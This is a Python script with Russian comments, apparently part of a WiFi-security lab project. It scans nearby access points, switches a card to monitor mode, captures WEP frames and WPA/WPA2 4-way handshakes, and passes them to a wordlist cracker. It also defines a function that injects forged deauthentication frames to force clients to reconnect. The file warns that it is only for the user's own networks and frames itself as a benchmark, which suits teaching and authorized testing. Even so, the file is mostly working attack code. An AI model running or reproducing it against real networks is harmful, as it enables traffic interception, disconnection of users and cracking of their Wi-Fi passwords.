"""
capture_real.py — Захват реальных фреймов с сетевого интерфейса
================================================================
Сбор фреймов WEP / WPA2-handshake с живого WiFi-интерфейса
для использования в лабораторной работе и бенчмарке.

Зависимости:
    pip install scapy tqdm

Требования:
    • Linux с wireless-интерфейсом (iwconfig / iw)
    • Права root (sudo) — для monitor mode и raw sockets
    • Пакет aircrack-ng (опционально, для перевода в monitor mode)

Режимы работы:
    1. wep    — захватывает зашифрованные WEP-фреймы → сохраняет .wep
    2. wpa    — захватывает WPA/WPA2 4-way handshake → сохраняет .json
    3. scan   — только сканирует AP в эфире (без захвата)
    4. bench  — захватывает фреймы и сразу прогоняет бенчмарк

Использование:
    # Сканировать AP
    sudo python capture_real.py scan

    # Захватить WEP-фреймы (нужна WEP-сеть)
    sudo python capture_real.py wep --ssid MyWepNet --count 200 --out data/captures/real_wep.wep

    # Захватить WPA2-рукопожатие (нужен клиент, который подключается)
    sudo python capture_real.py wpa --ssid HomeNetwork --out data/captures/real_wpa2.json

    # Бенчмарк на реальных данных
    sudo python capture_real.py bench --capture data/captures/real_wpa2.json

Важно:
    Инструмент предназначен ТОЛЬКО для тестирования ВАШИХ СОБСТВЕННЫХ сетей
    или сетей, для которых у вас есть явное письменное разрешение.
    Перехват чужих сетей — уголовно наказуемо.
"""

import os
import sys
import time
import json
import struct
import argparse
import subprocess
from datetime import datetime
from typing import Optional

# ─── Зависимости ──────────────────────────────────────────────────────────────

try:
    from scapy.all import (
        sniff, Dot11, Dot11Beacon, Dot11Elt, Dot11WEP,
        EAPOL, Dot11Auth, Dot11AssoReq, Dot11ReassoReq,
        RadioTap, conf, get_if_list
    )
    from scapy.layers.dot11 import Dot11CCMP, Dot11QoS
    HAS_SCAPY = True
except ImportError:
    HAS_SCAPY = False
    print("[!] scapy не установлен. Установите: pip install scapy")

try:
    from tqdm import tqdm
    HAS_TQDM = True
except ImportError:
    HAS_TQDM = False

# Импорт из проекта
sys.path.insert(0, os.path.dirname(__file__))
try:
    from src.wep.wep_gen import MAGIC as WEP_MAGIC
    from src.benchmark.benchmark import (
        benchmark_wep, benchmark_wpa, benchmark_wpa2_full,
        benchmark_pbkdf2, print_summary
    )
    HAS_PROJECT = True
except ImportError as e:
    HAS_PROJECT = False
    print(f"[!] Не удалось импортировать модули проекта: {e}")
    print("    Запускайте из корня wifi_security_project/")


# ─── Цвета ────────────────────────────────────────────────────────────────────

def green(s):   return f"\033[92m{s}\033[0m"
def red(s):     return f"\033[91m{s}\033[0m"
def yellow(s):  return f"\033[93m{s}\033[0m"
def bold(s):    return f"\033[1m{s}\033[0m"
def cyan(s):    return f"\033[96m{s}\033[0m"
def magenta(s): return f"\033[95m{s}\033[0m"


# ─── Работа с интерфейсом ──────────────────────────────────────────────────────

def check_root() -> None:
    """Проверяем root-права — без них raw sockets и monitor mode недоступны."""
    if os.geteuid() != 0:
        print(red("[!] Требуются права root. Запустите: sudo python capture_real.py ..."))
        sys.exit(1)


def list_wireless_interfaces() -> list[str]:
    """Возвращает список WiFi-интерфейсов системы."""
    try:
        result = subprocess.run(
            ["iw", "dev"], capture_output=True, text=True, timeout=5
        )
        ifaces = []
        for line in result.stdout.splitlines():
            line = line.strip()
            if line.startswith("Interface"):
                ifaces.append(line.split()[1])
        return ifaces
    except (FileNotFoundError, subprocess.TimeoutExpired):
        # Fallback через /proc/net/wireless
        try:
            with open("/proc/net/wireless") as f:
                lines = f.readlines()[2:]  # skip header
            return [l.split(":")[0].strip() for l in lines if ":" in l]
        except FileNotFoundError:
            return []


def enable_monitor_mode(iface: str) -> str:
    """
    Переводит интерфейс в monitor mode.
    Возвращает имя monitor-интерфейса (может измениться, напр. wlan0 → wlan0mon).
    """
    print(f"[*] Перевод {iface} в monitor mode...")

    # Пробуем через airmon-ng (из пакета aircrack-ng)
    result = subprocess.run(
        ["airmon-ng", "start", iface],
        capture_output=True, text=True
    )
    if result.returncode == 0:
        # airmon-ng может создать wlan0mon
        mon_iface = iface + "mon"
        if mon_iface in get_if_list():
            print(f"[+] Monitor mode включён: {mon_iface}")
            return mon_iface

    # Fallback: через ip link + iw
    try:
        subprocess.run(["ip", "link", "set", iface, "down"], check=True,
                       capture_output=True)
        subprocess.run(["iw", iface, "set", "monitor", "none"], check=True,
                       capture_output=True)
        subprocess.run(["ip", "link", "set", iface, "up"], check=True,
                       capture_output=True)
        print(f"[+] Monitor mode включён: {iface}")
        return iface
    except subprocess.CalledProcessError as e:
        print(red(f"[!] Не удалось включить monitor mode: {e}"))
        print(yellow("    Попробуйте вручную: sudo ip link set wlan0 down && "
                     "sudo iw wlan0 set monitor none && sudo ip link set wlan0 up"))
        sys.exit(1)


def disable_monitor_mode(iface: str, original_iface: str) -> None:
    """Возвращает интерфейс в managed mode."""
    print(f"\n[*] Возврат {iface} в managed mode...")
    try:
        subprocess.run(["airmon-ng", "stop", iface], capture_output=True)
    except FileNotFoundError:
        subprocess.run(["ip", "link", "set", iface, "down"], capture_output=True)
        subprocess.run(["iw", iface, "set", "type", "managed"], capture_output=True)
        subprocess.run(["ip", "link", "set", iface, "up"], capture_output=True)
    print(f"[+] Интерфейс восстановлен: {original_iface}")


def set_channel(iface: str, channel: int) -> None:
    """Переключает канал интерфейса."""
    subprocess.run(
        ["iw", "dev", iface, "set", "channel", str(channel)],
        capture_output=True
    )


# ─── Сканирование AP ──────────────────────────────────────────────────────────

class APScanner:
    """Сканирует эфир и собирает информацию о точках доступа."""

    def __init__(self):
        self.aps: dict[str, dict] = {}  # bssid → info

    def packet_handler(self, pkt) -> None:
        if not pkt.haslayer(Dot11Beacon):
            return

        bssid = pkt[Dot11].addr2
        if bssid in self.aps:
            return

        # Извлекаем SSID
        ssid = ""
        elt = pkt.getlayer(Dot11Elt)
        while elt:
            if elt.ID == 0:  # SSID element
                try:
                    ssid = elt.info.decode("utf-8", errors="replace")
                except Exception:
                    ssid = "<binary>"
                break
            elt = elt.payload.getlayer(Dot11Elt)

        # Канал
        channel = 0
        elt = pkt.getlayer(Dot11Elt)
        while elt:
            if elt.ID == 3 and len(elt.info) == 1:
                channel = elt.info[0]
                break
            elt = elt.payload.getlayer(Dot11Elt)

        # Тип защиты (по capability field)
        cap = pkt[Dot11Beacon].cap
        privacy = bool(cap & 0x10)

        # RSN / WPA2 — ищем тег 48
        security = "Open"
        elt = pkt.getlayer(Dot11Elt)
        while elt:
            if elt.ID == 48:
                security = "WPA2"
                break
            if elt.ID == 221 and elt.info[:4] == b'\x00\x50\xf2\x01':
                security = "WPA"
                break
            elt = elt.payload.getlayer(Dot11Elt)

        if privacy and security == "Open":
            security = "WEP"

        # RSSI из RadioTap
        rssi = -99
        if pkt.haslayer(RadioTap):
            try:
                rssi = -(256 - ord(pkt[RadioTap].dBm_AntSignal or b'\x9d'))
            except Exception:
                pass

        self.aps[bssid] = {
            "ssid":     ssid or "<hidden>",
            "bssid":    bssid,
            "channel":  channel,
            "security": security,
            "rssi":     rssi,
        }

    def print_results(self) -> None:
        if not self.aps:
            print(yellow("  Сетей не обнаружено."))
            return

        print(bold(f"\n{'='*70}"))
        print(bold(f"  {'SSID':<25} {'BSSID':<20} {'CH':>3}  {'Защита':<8}  {'RSSI':>5}"))
        print(f"{'─'*70}")
        for ap in sorted(self.aps.values(), key=lambda x: -x['rssi']):
            sec = ap['security']
            if sec == 'WEP':
                sec_str = red(f"{'WEP':<8}")
            elif sec == 'WPA':
                sec_str = yellow(f"{'WPA':<8}")
            elif sec == 'WPA2':
                sec_str = green(f"{'WPA2':<8}")
            else:
                sec_str = f"{'Open':<8}"

            print(f"  {ap['ssid']:<25} {ap['bssid']:<20} {ap['channel']:>3}  "
                  f"{sec_str}  {ap['rssi']:>4} dBm")
        print(bold(f"{'='*70}\n"))
        print(f"  Найдено AP: {len(self.aps)}")
        wep_count = sum(1 for a in self.aps.values() if a['security'] == 'WEP')
        if wep_count:
            print(red(f"  WEP-сетей: {wep_count} — уязвимы!"))


def do_scan(iface: str, duration: int = 15) -> dict:
    """Сканирует эфир на duration секунд."""
    check_root()
    scanner = APScanner()

    print(bold(f"\n{'='*60}"))
    print(bold(f"  WiFi Сканирование ({iface}, {duration}s)"))
    print(bold(f"{'='*60}"))
    print(f"  Сканирую каналы 1-13...")

    # Hop по каналам в отдельном потоке
    import threading
    stop_hop = threading.Event()

    def channel_hopper():
        channels = list(range(1, 14))
        i = 0
        while not stop_hop.is_set():
            set_channel(iface, channels[i % len(channels)])
            i += 1
            time.sleep(0.3)

    hopper = threading.Thread(target=channel_hopper, daemon=True)
    hopper.start()

    try:
        sniff(
            iface=iface,
            prn=scanner.packet_handler,
            timeout=duration,
            store=False
        )
    except KeyboardInterrupt:
        print(yellow("\n[*] Сканирование прервано"))
    finally:
        stop_hop.set()

    scanner.print_results()
    return scanner.aps


# ─── Захват WEP-фреймов ────────────────────────────────────────────────────────

class WEPCapture:
    """
    Захватывает зашифрованные WEP Data-фреймы.

    WEP-фрейм в эфире: [RadioTap][Dot11 header][Dot11WEP: IV(3) + KeyID(1) + ciphertext]
    Нас интересует только часть Dot11WEP (IV + ciphertext) — именно это читает wep_crack.py.
    """

    def __init__(self, target_ssid: Optional[str] = None,
                 target_bssid: Optional[str] = None):
        self.target_ssid  = target_ssid
        self.target_bssid = target_bssid
        self.frames: list[bytes] = []
        self.bssid_resolved: Optional[str] = None
        self.key_len: int = 5  # WEP-40 по умолчанию (5 байт)

    def _match_ap(self, pkt) -> bool:
        """Проверяет, принадлежит ли фрейм целевой AP."""
        if self.target_bssid:
            return (pkt[Dot11].addr1 == self.target_bssid or
                    pkt[Dot11].addr2 == self.target_bssid or
                    pkt[Dot11].addr3 == self.target_bssid)
        if self.target_ssid and self.bssid_resolved:
            return (pkt[Dot11].addr1 == self.bssid_resolved or
                    pkt[Dot11].addr2 == self.bssid_resolved or
                    pkt[Dot11].addr3 == self.bssid_resolved)
        return True  # захватываем всё если цель не указана

    def beacon_handler(self, pkt) -> None:
        """Извлекаем BSSID по имени SSID из Beacon-фреймов."""
        if not self.target_ssid or self.bssid_resolved:
            return
        if not pkt.haslayer(Dot11Beacon):
            return

        elt = pkt.getlayer(Dot11Elt)
        while elt:
            if elt.ID == 0:
                try:
                    ssid = elt.info.decode("utf-8", errors="replace")
                    if ssid == self.target_ssid:
                        self.bssid_resolved = pkt[Dot11].addr2
                        print(f"\n[+] BSSID найден: {self.bssid_resolved} ({self.target_ssid})")
                except Exception:
                    pass
                break
            elt = elt.payload.getlayer(Dot11Elt)

    def data_handler(self, pkt) -> None:
        """Перехватываем зашифрованные WEP Data-фреймы."""
        if not pkt.haslayer(Dot11):
            return

        # Тип 2 = Data, FC Protected bit должен быть установлен
        if pkt[Dot11].type != 2:
            return
        if not (pkt[Dot11].FCfield & 0x40):  # Protected flag
            return
        if not pkt.haslayer(Dot11WEP):
            return
        if not self._match_ap(pkt):
            return

        wep_layer = pkt[Dot11WEP]

        # Извлекаем IV (3 байта) + KeyID (1 байт) + зашифрованные данные
        # Scapy хранит IV отдельно, ciphertext — в payload
        try:
            iv_bytes  = bytes([wep_layer.iv[0], wep_layer.iv[1], wep_layer.iv[2]])
            key_id    = bytes([wep_layer.keyid])
            ciphertext = bytes(wep_layer.wepdata)

            # Формат как в wep_encrypt(): IV(3) | KeyID(1) | ciphertext(n)
            frame_bytes = iv_bytes + key_id + ciphertext
            self.frames.append(frame_bytes)
        except Exception as e:
            return  # битый фрейм — пропускаем

    def packet_handler(self, pkt) -> None:
        self.beacon_handler(pkt)
        self.data_handler(pkt)

    def save(self, output_path: str) -> dict:
        """Сохраняет захваченные фреймы в формат .wep (как wep_gen.py)."""
        if not self.frames:
            raise RuntimeError("Нет захваченных фреймов")

        os.makedirs(os.path.dirname(output_path) or ".", exist_ok=True)

        with open(output_path, 'wb') as f:
            f.write(WEP_MAGIC)
            f.write(struct.pack('<B', self.key_len))
            f.write(struct.pack('<I', len(self.frames)))
            for frame in self.frames:
                f.write(struct.pack('<H', len(frame)))
                f.write(frame)

        meta = {
            "protocol":    "WEP",
            "source":      "real_capture",
            "ssid":        self.target_ssid or "unknown",
            "bssid":       self.bssid_resolved or self.target_bssid or "unknown",
            "key_length":  self.key_len * 8,
            "num_frames":  len(self.frames),
            "capture_file": output_path,
            "captured_at": datetime.now().isoformat(),
        }
        meta_path = output_path.replace('.wep', '_meta.json')
        with open(meta_path, 'w') as f:
            json.dump(meta, f, indent=2)

        print(f"\n{bold('[+] WEP-захват сохранён:')}")
        print(f"    Файл:    {output_path}")
        print(f"    Фреймов: {len(self.frames)}")
        print(f"    BSSID:   {self.bssid_resolved or 'unknown'}")
        print(f"    Метаданные: {meta_path}")
        return meta


def do_capture_wep(
    iface: str,
    ssid: Optional[str] = None,
    bssid: Optional[str] = None,
    count: int = 200,
    timeout: int = 120,
    output: str = "data/captures/real_wep.wep",
    key_len: int = 5
) -> Optional[dict]:
    """Захватывает WEP Data-фреймы с живого интерфейса."""
    check_root()

    cap = WEPCapture(target_ssid=ssid, target_bssid=bssid)
    cap.key_len = key_len

    print(bold(f"\n{'='*60}"))
    print(bold(f"  WEP Захват фреймов"))
    print(bold(f"{'='*60}"))
    if ssid:
        print(f"  Цель SSID:  {cyan(ssid)}")
    if bssid:
        print(f"  Цель BSSID: {cyan(bssid)}")
    print(f"  Нужно:      {count} фреймов")
    print(f"  Таймаут:    {timeout}s")
    print(f"  Интерфейс: {iface}")
    print(f"\n  {yellow('Ожидание зашифрованных WEP Data-фреймов...')}")
    print(f"  (Нужна активная WEP-сеть с трафиком)")
    print(f"  Ctrl+C — остановить досрочно\n")

    start = time.perf_counter()
    last_print = 0

    def progress_handler(pkt):
        cap.packet_handler(pkt)
        n = len(cap.frames)
        nonlocal last_print
        if n != last_print:
            elapsed = time.perf_counter() - start
            rate = n / elapsed if elapsed > 0 else 0
            eta = (count - n) / rate if rate > 0 else float('inf')
            eta_str = f"{eta:.0f}s" if eta != float('inf') else "—"
            print(f"\r  [{n:>4}/{count}] фреймов | {rate:.1f} ф/с | ETA: {eta_str}  ",
                  end='', flush=True)
            last_print = n
        return n >= count  # stop_filter

    try:
        sniff(
            iface=iface,
            prn=lambda pkt: None,
            stop_filter=lambda pkt: (cap.packet_handler(pkt) or False) or len(cap.frames) >= count,
            timeout=timeout,
            store=False
        )
    except KeyboardInterrupt:
        print(yellow(f"\n[*] Прервано вручную ({len(cap.frames)} фреймов захвачено)"))

    if not cap.frames:
        print(red("\n[!] Фреймы не захвачены."))
        print(yellow("    Проверьте:"))
        print(yellow("    1. Интерфейс в monitor mode?"))
        print(yellow("    2. Вы на правильном канале? (iw dev <iface> set channel N)"))
        print(yellow("    3. Сеть действительно использует WEP?"))
        print(yellow("    4. Есть активный трафик в сети?"))
        return None

    return cap.save(output)


# ─── Захват WPA/WPA2 Handshake ─────────────────────────────────────────────────

class WPA2Capture:
    """
    Захватывает 4-way handshake WPA/WPA2.

    Нам нужны:
    - Message 1: AP → Client (содержит ANonce)
    - Message 2: Client → AP (содержит SNonce + MIC)  ← самое важное

    Опциональная деаутентификация клиента заставляет его
    повторно выполнить handshake.
    """

    def __init__(self, target_ssid: Optional[str] = None,
                 target_bssid: Optional[str] = None):
        self.target_ssid   = target_ssid
        self.target_bssid  = target_bssid
        self.bssid_resolved: Optional[str] = None

        # Компоненты handshake
        self.anonce:      Optional[bytes] = None
        self.snonce:      Optional[bytes] = None
        self.aa:          Optional[bytes] = None  # AP MAC
        self.sa:          Optional[bytes] = None  # Client MAC
        self.mic:         Optional[bytes] = None
        self.eapol_frame: Optional[bytes] = None
        self.protocol:    str = "WPA2"
        self.ssid:        str = target_ssid or "unknown"
        self.complete:    bool = False

    def _parse_eapol_key(self, raw: bytes) -> Optional[dict]:
        """
        Парсит EAPOL-Key фрейм (Message 1 или 2 из 4-way handshake).

        Структура EAPOL-Key (IEEE 802.11i):
            [0]     Version
            [1]     Type (0x03 = EAPOL-Key)
            [2:4]   Length (big-endian)
            [4]     Descriptor type (0x02 = RSN/WPA2)
            [5:7]   Key Information (big-endian)
            [7:9]   Key Length
            [9:17]  Replay Counter
            [17:49] Nonce (ANonce или SNonce)
            [49:65] EAPOL-Key IV
            [65:73] RSC
            [73:81] Reserved
            [81:97] MIC (16 байт)
            [97:99] Key Data Length
            [99:]   Key Data
        """
        if len(raw) < 99:
            return None
        if raw[1] != 0x03:   # не EAPOL-Key
            return None
        if raw[4] != 0x02:   # не RSN descriptor
            return None

        key_info_raw = int.from_bytes(raw[5:7], 'big')

        # Флаги Key Information
        mic_flag     = bool(key_info_raw & (1 << 8))
        ack_flag     = bool(key_info_raw & (1 << 7))
        pairwise_flag = bool(key_info_raw & (1 << 3))

        nonce    = raw[17:49]
        mic_val  = raw[81:97]
        has_mic  = any(mic_val)  # ненулевой MIC

        # Определяем тип шифрования
        key_ver = key_info_raw & 0x07
        protocol = "WPA2" if key_ver == 2 else "WPA"

        return {
            "key_info":  key_info_raw,
            "mic_flag":  mic_flag,
            "ack_flag":  ack_flag,
            "pairwise":  pairwise_flag,
            "nonce":     nonce,
            "mic":       mic_val,
            "has_mic":   has_mic,
            "protocol":  protocol,
            "raw":       raw,
        }

    def packet_handler(self, pkt) -> None:
        # Beacon → определяем BSSID
        if pkt.haslayer(Dot11Beacon) and self.target_ssid and not self.bssid_resolved:
            elt = pkt.getlayer(Dot11Elt)
            while elt:
                if elt.ID == 0:
                    try:
                        if elt.info.decode("utf-8", errors="replace") == self.target_ssid:
                            self.bssid_resolved = pkt[Dot11].addr2
                            print(f"\n[+] AP найдена: {self.bssid_resolved} ({self.target_ssid})")
                    except Exception:
                        pass
                    break
                elt = elt.payload.getlayer(Dot11Elt)

        # EAPOL → ищем handshake
        if not pkt.haslayer(EAPOL):
            return

        src_mac = pkt[Dot11].addr2 if pkt.haslayer(Dot11) else None
        dst_mac = pkt[Dot11].addr1 if pkt.haslayer(Dot11) else None
        ap_mac  = self.bssid_resolved or self.target_bssid

        # Извлекаем сырые байты EAPOL (от начала EAPOL-заголовка)
        try:
            raw_eapol = bytes(pkt[EAPOL])
        except Exception:
            return

        parsed = self._parse_eapol_key(raw_eapol)
        if not parsed:
            return

        # Message 1: от AP (ack=1, mic=0) — содержит ANonce
        if parsed["ack_flag"] and not parsed["has_mic"] and parsed["pairwise"]:
            self.anonce = parsed["nonce"]
            self.aa     = bytes.fromhex(src_mac.replace(":", "")) if src_mac else None
            self.protocol = parsed["protocol"]
            print(f"\n[>] Message 1 (ANonce) от AP: {src_mac}")

        # Message 2: от клиента (mic=1, ack=0) — содержит SNonce + MIC
        elif parsed["mic_flag"] and not parsed["ack_flag"] and parsed["pairwise"] and parsed["has_mic"]:
            if self.anonce is None:
                # Message 2 без Message 1 — иногда бывает, берём что есть
                self.aa = bytes.fromhex(dst_mac.replace(":", "")) if dst_mac else None

            self.snonce = parsed["nonce"]
            self.sa     = bytes.fromhex(src_mac.replace(":", "")) if src_mac else None
            self.mic    = parsed["mic"]

            # Нулируем MIC в копии фрейма (для верификации паролей)
            frame_zeroed = bytearray(raw_eapol)
            frame_zeroed[81:97] = b'\x00' * 16
            self.eapol_frame = bytes(frame_zeroed)
            self.protocol    = parsed["protocol"]

            print(f"[>] Message 2 (SNonce+MIC) от клиента: {src_mac}")

            if self.anonce is not None and self.aa is not None:
                self.complete = True
                print(green(f"\n[+] ПОЛНЫЙ HANDSHAKE ЗАХВАЧЕН!"))

    def save(self, output_path: str) -> dict:
        """Сохраняет handshake в JSON-формат (как wpa_gen.py)."""
        if not self.complete:
            raise RuntimeError("Handshake неполный (нужны Message 1 + Message 2)")

        os.makedirs(os.path.dirname(output_path) or ".", exist_ok=True)

        capture = {
            "protocol":    self.protocol,
            "ssid":        self.ssid,
            "aa":          self.aa.hex(),
            "sa":          self.sa.hex(),
            "anonce":      self.anonce.hex(),
            "snonce":      self.snonce.hex(),
            "eapol_frame": self.eapol_frame.hex(),
            "mic":         self.mic.hex(),
            "source":      "real_capture",
            "captured_at": datetime.now().isoformat(),
        }

        with open(output_path, 'w') as f:
            json.dump(capture, f, indent=2)

        print(f"\n{bold('[+] Handshake сохранён:')}")
        print(f"    Файл:     {output_path}")
        print(f"    SSID:     {self.ssid}")
        print(f"    Protocol: {self.protocol}")
        print(f"    AP  MAC:  {':'.join(self.aa.hex()[i:i+2] for i in range(0,12,2))}")
        print(f"    CLI MAC:  {':'.join(self.sa.hex()[i:i+2] for i in range(0,12,2))}")
        print(f"    MIC:      {self.mic.hex()}")
        return capture


def do_deauth(iface: str, bssid: str, client: str = "FF:FF:FF:FF:FF:FF",
              count: int = 5) -> None:
    """
    Отправляет deauth-пакеты для принудительного пересоединения клиента.
    ТОЛЬКО для своих сетей / в рамках разрешённого пентеста!
    """
    from scapy.all import RadioTap, Dot11, Dot11Deauth, sendp

    print(f"\n[*] Отправка {count} deauth-пакетов → {bssid} (клиент: {client})")

    pkt = (
        RadioTap() /
        Dot11(addr1=client, addr2=bssid, addr3=bssid, type=0, subtype=12) /
        Dot11Deauth(reason=7)
    )
    sendp(pkt, iface=iface, count=count, inter=0.1, verbose=False)
    print(f"[+] Deauth отправлен. Ждём handshake...")


def do_capture_wpa(
    iface: str,
    ssid: Optional[str] = None,
    bssid: Optional[str] = None,
    timeout: int = 60,
    deauth: bool = False,
    output: str = "data/captures/real_wpa2.json"
) -> Optional[dict]:
    """Захватывает WPA/WPA2 4-way handshake."""
    check_root()

    cap = WPA2Capture(target_ssid=ssid, target_bssid=bssid)

    print(bold(f"\n{'='*60}"))
    print(bold(f"  WPA2 Handshake Захват"))
    print(bold(f"{'='*60}"))
    if ssid:
        print(f"  Цель SSID:  {cyan(ssid)}")
    if bssid:
        print(f"  Цель BSSID: {cyan(bssid)}")
    print(f"  Таймаут:    {timeout}s")
    print(f"  Deauth:     {'Да' if deauth else 'Нет'}")
    print(f"\n  {yellow('Ожидание 4-way handshake...')}")
    print(f"  (Handshake происходит когда клиент подключается к AP)")

    if deauth:
        print(f"\n  {red('ВНИМАНИЕ: Deauth-атака только для ваших сетей!')}")

    print(f"  Ctrl+C — остановить\n")

    start = time.perf_counter()

    try:
        sniff(
            iface=iface,
            prn=cap.packet_handler,
            stop_filter=lambda pkt: cap.complete,
            timeout=timeout,
            store=False
        )
    except KeyboardInterrupt:
        print(yellow(f"\n[*] Прервано вручную"))

    if cap.complete:
        return cap.save(output)

    # Частичный захват
    if cap.anonce is not None:
        print(yellow(f"\n[!] Захвачен только Message 1 (ANonce). Message 2 не получен."))
        print(yellow(f"    Попробуйте с --deauth или подождите, пока клиент переподключится."))
    elif cap.snonce is not None:
        print(yellow(f"\n[!] Захвачен только Message 2 (без ANonce)."))
        print(yellow(f"    Начните захват до того, как клиент подключится."))
    else:
        print(red(f"\n[!] Handshake не захвачен за {timeout}s."))
        print(yellow(f"    Советы:"))
        print(yellow(f"    1. Убедитесь, что интерфейс в monitor mode на правильном канале"))
        print(yellow(f"    2. Используйте --deauth чтобы принудить клиента переподключиться"))
        print(yellow(f"    3. Увеличьте таймаут: --timeout 300"))

    return None


# ─── Бенчмарк на реальных данных ──────────────────────────────────────────────

def do_bench_real(capture_path: str, wordlist: str = "data/wordlists/passwords.txt",
                  duration: float = 3.0) -> None:
    """
    Прогоняет бенчмарки на синтетических данных + атаку на реальный/сгенерированный capture.
    """
    if not HAS_PROJECT:
        print(red("[!] Модули проекта недоступны"))
        return

    print(bold(f"\n{'='*65}"))
    print(bold(f"  WiFi Security Benchmark (синтетика + реальный захват)"))
    print(bold(f"{'='*65}\n"))

    results = []
    results.append(benchmark_wep(duration))
    results.append(benchmark_wpa(duration))
    results.append(benchmark_wpa2_full(duration))
    results.append(benchmark_pbkdf2(duration))

    print_summary(results)

    # Атака на захваченный handshake
    if os.path.exists(capture_path):
        from src.wpa.wpa_crack import crack_wpa
        from src.wpa.wpa_gen import load_handshake

        print(bold(f"\n{'='*65}"))
        print(bold(f"  Атака на реальный/захваченный handshake"))
        print(bold(f"{'='*65}"))

        if not os.path.exists(wordlist):
            print(red(f"[!] Wordlist не найден: {wordlist}"))
            return

        handshake = load_handshake(capture_path)
        crack_wpa(handshake, wordlist)
    else:
        print(yellow(f"\n[!] Файл захвата не найден: {capture_path}"))
        print(yellow(f"    Сначала захватите handshake: sudo python capture_real.py wpa ..."))


# ─── CLI ────────────────────────────────────────────────────────────────────

def main():
    if not HAS_SCAPY:
        print(red("[!] Установите scapy: pip install scapy"))
        sys.exit(1)

    parser = argparse.ArgumentParser(
        description="Захват реальных WiFi-фреймов (WEP/WPA2) — только для своих сетей!",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Примеры:
  # Сканировать сети (нужен monitor mode)
  sudo python capture_real.py scan --iface wlan0mon

  # Захватить WEP-фреймы (200 штук)
  sudo python capture_real.py wep --iface wlan0mon --ssid MyWEP --count 200

  # Захватить WPA2-рукопожатие (ждём подключения клиента)
  sudo python capture_real.py wpa --iface wlan0mon --ssid HomeNetwork

  # Захватить WPA2-рукопожатие с deauth (принудительное переподключение)
  sudo python capture_real.py wpa --iface wlan0mon --ssid HomeNetwork --deauth

  # Бенчмарк + атака на захват
  sudo python capture_real.py bench --capture data/captures/real_wpa2.json

Перевод интерфейса в monitor mode (вручную):
  sudo ip link set wlan0 down
  sudo iw wlan0 set monitor none
  sudo ip link set wlan0 up
  # или через aircrack-ng:
  sudo airmon-ng start wlan0
        """
    )

    sub = parser.add_subparsers(dest="mode", required=True)

    # scan
    p_scan = sub.add_parser("scan", help="Сканировать WiFi-сети в эфире")
    p_scan.add_argument("--iface",    default=None, help="Wireless интерфейс (monitor mode)")
    p_scan.add_argument("--duration", type=int, default=15, help="Длительность сканирования (сек)")

    # wep
    p_wep = sub.add_parser("wep", help="Захватить WEP Data-фреймы")
    p_wep.add_argument("--iface",   required=True, help="Интерфейс в monitor mode")
    p_wep.add_argument("--ssid",    default=None,  help="SSID целевой WEP-сети")
    p_wep.add_argument("--bssid",   default=None,  help="BSSID (MAC) целевой AP")
    p_wep.add_argument("--count",   type=int, default=200, help="Сколько фреймов захватить")
    p_wep.add_argument("--timeout", type=int, default=180, help="Таймаут в секундах")
    p_wep.add_argument("--key-len", type=int, default=5, choices=[5, 13],
                        help="Длина ключа в байтах (5=WEP-40, 13=WEP-104)")
    p_wep.add_argument("--out",     default="data/captures/real_wep.wep")

    # wpa
    p_wpa = sub.add_parser("wpa", help="Захватить WPA/WPA2 4-way handshake")
    p_wpa.add_argument("--iface",   required=True)
    p_wpa.add_argument("--ssid",    default=None)
    p_wpa.add_argument("--bssid",   default=None)
    p_wpa.add_argument("--timeout", type=int, default=60)
    p_wpa.add_argument("--deauth",  action="store_true",
                        help="Отправить deauth для принудительного переподключения")
    p_wpa.add_argument("--out",     default="data/captures/real_wpa2.json")

    # bench
    p_bench = sub.add_parser("bench", help="Бенчмарк + атака на захваченный handshake")
    p_bench.add_argument("--capture",  default="data/captures/real_wpa2.json")
    p_bench.add_argument("--wordlist", default="data/wordlists/passwords.txt")
    p_bench.add_argument("--duration", type=float, default=3.0,
                         help="Длительность каждого суб-бенчмарка (сек)")

    args = parser.parse_args()

    # ── Выполнение ──
    if args.mode == "scan":
        ifaces = list_wireless_interfaces()
        if not ifaces:
            print(red("[!] Wireless-интерфейсы не найдены"))
            sys.exit(1)

        iface = args.iface or ifaces[0]
        print(f"[*] Доступные интерфейсы: {', '.join(ifaces)}")
        print(f"[*] Используем: {iface}")
        do_scan(iface, args.duration)

    elif args.mode == "wep":
        do_capture_wep(
            iface=args.iface,
            ssid=args.ssid,
            bssid=args.bssid,
            count=args.count,
            timeout=args.timeout,
            output=args.out,
            key_len=args.key_len
        )

    elif args.mode == "wpa":
        result = do_capture_wpa(
            iface=args.iface,
            ssid=args.ssid,
            bssid=args.bssid,
            timeout=args.timeout,
            deauth=args.deauth,
            output=args.out
        )
        if result and args.deauth:
            print(yellow(f"\n[*] Handshake готов для атаки:"))
            print(f"    python src/wpa/wpa_crack.py --capture {args.out}")

    elif args.mode == "bench":
        do_bench_real(args.capture, args.wordlist, args.duration)


if __name__ == "__main__":
    main()
